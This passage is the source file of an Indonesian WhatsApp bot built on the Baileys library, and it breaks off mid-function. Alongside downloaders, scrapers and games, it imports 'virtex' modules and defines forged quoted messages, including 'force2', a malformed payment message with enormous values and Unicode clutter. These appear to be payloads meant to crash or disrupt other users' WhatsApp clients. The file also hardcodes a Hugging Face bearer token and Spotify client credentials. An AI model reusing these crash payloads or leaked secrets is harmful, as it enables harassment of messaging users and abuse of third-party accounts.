
process.on('uncaughtException', console.error)
require('./setting')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, generateWAMessage, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require("@whiskeysockets/baileys")
const { scrape } = require('d-scrape');
const fs = require('fs');
const fetch = require('node-fetch');
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const speed = require('performance-now')
const axios = require('axios')
const fsx = require('fs-extra')

const mark = `0@s.whatsapp.net`
const dns = require('dns');
const FormData = require('form-data')
const gtts = require('node-gtts')
const ytdl = require("ytdl-core")
const userdb = global.db.data.users[m.sender]
const { youtubeDownloader } = require('./lib/youtube');
const schedule = require('node-schedule')
const canvafy = require('canvafy')
const api = require("api-dylux")
const { youtube } = require("btch-downloader")
const cheerio = require('cheerio');
const ms = require("ms");
const crypto = require('crypto')
const https = require('https')
const yts = require("yt-search")
const uploadImage = require('./lib/uploadImage')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { mediafireDl } = require('./database/mediafire.js')
const jsobfus = require('javascript-obfuscator')
const { exec, spawn, execSync } = require('child_process')
const { ngazap } = require('./RulMedia/virtex/ngazap')
const { buttonkal } = require('./RulMedia/virtex/buttonkal')
const { cttl } = require('./RulMedia/virtex/cttl')
const { tizi } = require('./RulMedia/virtex/tizi')
const { weg } = require('./RulMedia/virtex/weg')
const { virtex7 } = require('./RulMedia/virtex/virtex7')
const { ios } = require("./virtex/ios.js")
const { cerpen } = require('./lib/func_Cerpen');
const { TelegraPH } = require("./lib/TelegraPH")
const { top4top } = require(`./lib/uploader`)
const { uptotelegra } = require(`./upload`)
const { sswebDesktop, sswebTablet, sswebPhone } = require('./lib/ssweb')
const { pinterest, Tiktok, jarak, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone, styletext } = require("./lib/scraper")
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const moment = require('moment-timezone')
const { pickRandom, smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, formatp, parseMention, getRandom, getGroupAdmins, resize } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { 
getRegisteredRandomId, 
addRegisteredUser, 
createSerial, 
checkRegisteredUser 
} = require('./lib/register.js')

//
const banned = [];
const lastMessageTime = {};
function handleMessage(m) {
    const users = m.sender;

    if (banned.includes(users)) {
        return;
    }
    const currentTime = Date.now();
    const lastTime = lastMessageTime[users] || 0;
    if (currentTime - lastTime < 5000) {
        banned.push(users);
        fs.writeFileSync('./RulMedia/dbnye/banned.json', JSON.stringify(banned, null, 2));
        KhaerulZx.sendTextWithMentions(m.chat, `User ${users} telah dibanned karena spam.`, m);
        return;
    }
    lastMessageTime[users] = currentTime;
}

fs.writeFileSync('./database/database.json', JSON.stringify(global.db.data, null, 2))
// read database
let tebakbom = []
let tebakgambar = []
let tebakjkt48 = []
let tebakkata = []
let _family100 = []
let tebakkabupaten = []
let tebaksusunkata = []
let tekateki = []
let tebaktebakan = []
let siapaaku = []
let tebaklirik = []
let petakbom = []
let tebakbendera = []
let tebaklagu = []
//
let blacklist = {};


 //

const thumb = fs.readFileSync ('./RulMedia/image/KhaerulZx.jpg')
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const pengguna = JSON.parse(fs.readFileSync('./RulMedia/dbnye/wihh.json'))
const prem = require("./lib/premium");
const seller = require('./lib/seller');
const sellers = JSON.parse(fs.readFileSync('./database/seller.json', 'utf-8'));
const anon = require('./lib/menfess') 
const { TelegraPh } = require('./lib/uploader')
const { antiSpam } = require('./lib/antispam')
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const xeonverifieduser = JSON.parse(fs.readFileSync('./RulMedia/dbnye/wihh.json'))
let ometv = JSON.parse(fs.readFileSync('./lib/ometv.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
let ntvirtex = JSON.parse(fs.readFileSync('./database/enable/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/enable/antitoxic.json'));
let ntasing = JSON.parse(fs.readFileSync('./database/enable/antiasing.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/enable/antiwame.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/enable/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/enable/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/enable/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/enable/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/enable/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/enable/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/enable/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/enable/antilinkytvideo.json'));
    const { addSaldo, minSaldo, cekSaldo } = require("./lib/deposit");
let db_saldo = JSON.parse(fs.readFileSync("./lib/saldo.json"));
let depositPath = "./lib/deposit/"
const translate = require("@vitalets/google-translate-api");
const chatbot = JSON.parse(fs.readFileSync("./lib/chatbot.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const fakedoc = fs.readFileSync(`./src/pk/bruhhh.apk`)
const fakejpg = fs.readFileSync(`./src/bruhhh.jpg`)
let warns = JSON.parse(fs.readFileSync('./database/warns.json', 'utf-8'));
const monitoredNumber = '62895392968503@s.whatsapp.net';
const responseInterval = 30 * 60 * 1000;
let lastResponseTime = {};
const allowedNumbers = ["62895392968503@s.whatsapp.net", "62895323001687@s.whatsapp.net"]; //nomor yang diizinkan buat kirim media walaupun antimedia sudah diaktifkan
let antiMediaGroup = {};
let antiNsfwGroup = {};
let viewOnceMediaGroup = {};
const ownerNumber = '62895392968503@s.whatsapp.net'; // Ganti dengan nomor owner
const botNumber = '6283850221901@s.whatsapp.net';
let autoGempaStatus = false;
let lastGempaTime = null;
let autoApproveGroups = new Set(['120363214589220937@g.us','120363161895393840@g.us']);

async function autoGempaUpdate() {
    if (autoGempaStatus) {
        const link = 'https://data.bmkg.go.id/DataMKG/TEWS/';
        try {
            let res = await fetch(link + 'autogempa.json');
            let anu = await res.json();
            anu = anu.Infogempa.gempa;
            if (anu.Tanggal !== lastGempaTime) {
                lastGempaTime = anu.Tanggal;

                let txt = `*── 「 GEMPA NEWS 」 ──*\n\n${anu.Wilayah}\n\n`;
                txt += `Potensi : ${anu.Potensi}\n`;
                txt += `Tanggal : ${anu.Tanggal}\n`;
                txt += `Waktu : ${anu.Jam}\n\n`;
                txt += `Magnitude : ${anu.Magnitude}\n`;
                txt += `Kedalaman : ${anu.Kedalaman}\n`;
                txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`;
                for (let groupId of botGroupList) {
                    await KhaerulZx.sendMessage(groupId, { image: { url: link + anu.Shakemap }, caption: txt });
                }
            }
        } catch (e) {
            console.log("Error mengambil data gempa:", e);
        }
    }
}
setInterval(autoGempaUpdate, 600000);



//==================================================//
//
module.exports = KhaerulZx = async (KhaerulZx, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//WM By Rulzz, Titenono lek ko hapus le😹
var budy = (typeof m.text == 'string' ? m.text : '')
const prefix = '.'
//=================================================//

const Styles = (text, style = 1) => {
  var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  xStr.map((v, i) =>
    replacer.push({
      original: v,
      convert: yStr[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const pushname = m.pushName || "No Name"

    
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}
//=================================================//

const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
//isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const botNumber = await KhaerulZx.decodeJid(KhaerulZx.user.id)
const isCreator = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await KhaerulZx.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : true
        const thumbnail2 = fs.readFileSync('./RulMedia/image/KhaerulZx.jpg');
const welcmm = m.isGroup ? wlcmm.includes(from) : true
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const AntiLink2 = m.isGroup ? ntilink.includes(from) : true
const Jpm = m.isGroup ? ntilink.includes(from) : false 
const isBan = banned.includes(m.sender)
const isRegistered = checkRegisteredUser(m.sender)
const isSeller = isCreator ? true : seller.checkSellerUser(m.sender, sellers);
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
//const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
//
const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363247886007681@newsletter',
    newsletterName: '',
    caption: body
}}}
//
const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal2 = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')	
const qtod = m.quoted? "true":"false"
const bii = JSON.parse(fs.readFileSync('./RulMedia/dbnye/wihh.json').toString())
const isSeler = [botNumber, ...bii].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const jangan = m.isGroup ? ntilink.includes(m.chat) : false
const AntiVirtex = m.isGroup ? ntvirtex.includes(from) : false
const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiWame = m.isGroup ? ntwame.includes(from) : false
//const AntiToxic = m.isGroup ? nttoxic.includes(from) : false
const AntiAsing = m.isGroup ? ntasing.includes(from) : false
const ChatBot = m.isGroup ? chatbot.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const antibot = JSON.parse(fs.readFileSync('./database/antibot.json'))
//Const
const cap = `${botname}`
//=================================================//

const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}

const fcall = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: body}}}

const reply = async(teks) => {KhaerulZx.sendMessage(from, {text: teks, mentions: await ments(teks)},{quoted:fcall})}

const totalFitur = () =>{
            var mytext = fs.readFileSync("./hanako.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
      

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}
//
async function downloadVideo(url) {
    const response = await fetch('https://shinoa.us.kg/api/download/ytdl', {
        method: 'POST',
        headers: {
            'accept': '*/*',
            'api_key': 'free',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            text: url
        })
    });

    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    return data;
}

//*[ PLAY/AUDIO/VIDEO FEATURES ]*

async function downloadMp3 (link) {
try {
KhaerulZx.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
KhaerulZx.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
KhaerulZx.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
KhaerulZx.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

 


              
              
//=================================================//
const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./RulMedia/image/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

async function text2img(data) {
  const response = await fetch(
    "https://api-inference.huggingface.co/models/Yntec/Ninja-Diffusers",
    {
      headers: { Authorization: "Bearer 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" },
      method: "POST",
      body: JSON.stringify(data),
    }
  );
  const result = await response.blob();
  return result;
}
//=================================================//


const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": "🌠 ZxV Client - Multi Device",
    "description": "Pe",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://call.whatsapp.com/video/hMwVijMQtUb0qBJL3lf0rv",
    "startTime": "1713724680"
  }
}
}

const KhaerulZxreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const KhaerulZxvoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const KhaerulZxbug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `pois0n - zxv`
}
}
}

const KhaerulZxbut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: 'pois0n - zxv',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const KhaerulZxcakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363247886007681@newsletter`,
newsletterName: `🔥`,
jpegThumbnail: fakejpg,
caption: ` ZxV - Bug ? \n ⿻ ${m.body || m.mtype} `,
inviteExpiration: Date.now() + 1814400000
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakedoc,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"title": `⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
'jpegThumbnail': fakejpg,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": fakejpg,
},
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"description": `⟠ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": "m",
"groupName": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"caption": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'jpegThumbnail': fakejpg,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
jpegThumbnail: fakejpg,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
"h": `Hmm`,
'jpegThumbnail': fakejpg,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
'jpegThumbnail': fakejpg,
thumbnail: fakejpg,
sendEphemeral: true
}
}
}

async function igdl2(url) {
            let res = await axios("https://indown.io/");
            let _$ = cheerio.load(res.data);
            let referer = _$("input[name=referer]").val();
            let locale = _$("input[name=locale]").val();
            let _token = _$("input[name=_token]").val();
            let { data } = await axios.post(
              "https://indown.io/download",
              new URLSearchParams({
                link: url,
                referer,
                locale,
                _token,
              }),
              {
                headers: {
                  cookie: res.headers["set-cookie"].join("; "),
                },
              }
            );
            let $ = cheerio.load(data);
            let result = [];
            let __$ = cheerio.load($("#result").html());
            __$("video").each(function () {
              let $$ = $(this);
              result.push({
                type: "video",
                thumbnail: $$.attr("poster"),
                url: $$.find("source").attr("src"),
              });
            });
            __$("img").each(function () {
              let $$ = $(this);
              result.push({
                type: "image",
                url: $$.attr("src"),
              });
            });
          
            return result;
          }
          
                      const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}


//
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
            result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};
async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
//
async function ytdlnew(videoUrl) {
    return new Promise(async (resolve, reject) => {
        try {
            const searchParams = new URLSearchParams();
            searchParams.append('query', videoUrl);
            searchParams.append('vt', 'mp3');
            const searchResponse = await axios.post(
                'https://tomp3.cc/api/ajax/search',
                searchParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (searchResponse.data.status !== 'ok') {
                throw new Error('Failed to search for the video.');
            }            
            const videoId = searchResponse.data.vid;
            const videoTitle = searchResponse.data.title;
            const mp4Options = searchResponse.data.links.mp4;
